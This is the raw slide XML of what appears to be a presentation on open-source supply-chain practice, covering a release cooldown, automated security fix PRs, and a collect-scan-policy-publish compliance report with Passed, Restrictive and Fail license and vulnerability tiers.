          <p:cNvPr id="11" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="3694176"/>
            <a:ext cx="512064" cy="512064"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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2" name="Icon 12" descr="Clock"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6752295" y="3817071"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3657600"/>
            <a:ext cx="4325112" cy="10058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7-day cooldown</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New releases age a week before adoption, a buffer against hijacked packages. Security fixes skip the wait.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="4764024"/>
            <a:ext cx="512064" cy="512064"/>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5" name="Icon 15" descr="ShieldCheck"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6752295" y="4886919"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4727448"/>
            <a:ext cx="4325112" cy="10058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Security updates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enable in Settings → Code security: alerts become fix PRs automatically.</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OSS compliance report: how it works</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License and vulnerability data merged into one policy decision per package</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="OSS step 1. Collect"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="2560320" cy="269748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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1783080"/>
            <a:ext cx="603504" cy="603504"/>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6" name="Icon 6" descr="ListChecks"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="922081" y="1927921"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2514600"/>
            <a:ext cx="21945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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Collect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2880360"/>
            <a:ext cx="2194560" cy="4572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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Package, version, license, scope</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3383280"/>
            <a:ext cx="2240280" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0A9BCD"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pnpm licenses list --json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0A9BCD"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CycloneDX SBOM (Maven)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="10" name="Connector 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3136392" y="2903220"/>
            <a:ext cx="228600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="OSS step 2. Scan"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3392424" y="1554480"/>
            <a:ext cx="2560320" cy="269748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2" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3621024" y="1783080"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06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3" name="Icon 13" descr="Bug"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3765865" y="1927921"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3621024" y="2514600"/>
            <a:ext cx="21945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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. Scan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3621024" y="2880360"/>
            <a:ext cx="2194560" cy="4572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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Known vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3621024" y="3383280"/>
            <a:ext cx="2240280" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F06400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OSV-Scanner</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F06400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitHub Advisory, NVD, OSV</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="Connector 17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5980176" y="2903220"/>
            <a:ext cx="228600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="OSS step 3. Apply policy"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="1554480"/>
            <a:ext cx="2560320" cy="269748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9" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6464808" y="1783080"/>
            <a:ext cx="603504" cy="603504"/>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0" name="Icon 20" descr="Scale"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6609649" y="1927921"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6464808" y="2514600"/>
            <a:ext cx="21945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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. Apply policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6464808" y="2880360"/>
            <a:ext cx="2194560" cy="4572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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Passed / Restrictive / Fail</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6464808" y="3383280"/>
            <a:ext cx="2240280" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="6E3CBE"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>oss-policy.json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="6E3CBE"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>oss-report.mjs (Node)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="24" name="Connector 24"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8823960" y="2903220"/>
            <a:ext cx="228600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="OSS step 4. Publish"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="1554480"/>
            <a:ext cx="2560320" cy="2697480"/>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6" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9308592" y="1783080"/>
            <a:ext cx="603504" cy="603504"/>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7" name="Icon 27" descr="FileSpreadsheet"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9453433" y="1927921"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9308592" y="2514600"/>
            <a:ext cx="21945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700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4. Publish</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9308592" y="2880360"/>
            <a:ext cx="2194560" cy="4572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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSV artifact + run summary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9308592" y="3383280"/>
            <a:ext cx="2240280" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="26AF72"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Job fails on any Fail</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="26AF72"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Report kept 30 days</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4480560"/>
            <a:ext cx="11091672" cy="384048"/>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400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSV columns</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4864608"/>
            <a:ext cx="11091672" cy="749808"/>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Project, Ecosystem, Package, Version, Scope, License, License Category,</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Vulnerabilities, Max Severity, Policy, Reason, Source</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Policy result: Passed, Restrictive or Fail</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Rules live in .github/oss-policy.json, so Legal can review the policy as code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Policy Passed"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="6035040" cy="1261872"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1883664"/>
            <a:ext cx="603504" cy="603504"/>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6" name="Icon 6" descr="CircleCheck"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="876361" y="2028505"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="1682496"/>
            <a:ext cx="49377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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="26AF72"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Passed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="2048256"/>
            <a:ext cx="4937760" cy="7315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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Allowed license (MIT, Apache-2.0, BSD, ISC...) and no restricted vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Policy Restrictive"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2971800"/>
            <a:ext cx="6035040" cy="1261872"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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0" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3300984"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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1" name="Icon 11" descr="TriangleAlert"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="876361" y="3445825"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="3099816"/>
            <a:ext cx="49377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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Restrictive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="3465576"/>
            <a:ext cx="4937760" cy="7315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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Copyleft (LGPL, MPL, EPL), unknown license, moderate CVE, or denied license in a dev-only dependency. Review, build continues</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Policy Fail"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4389120"/>
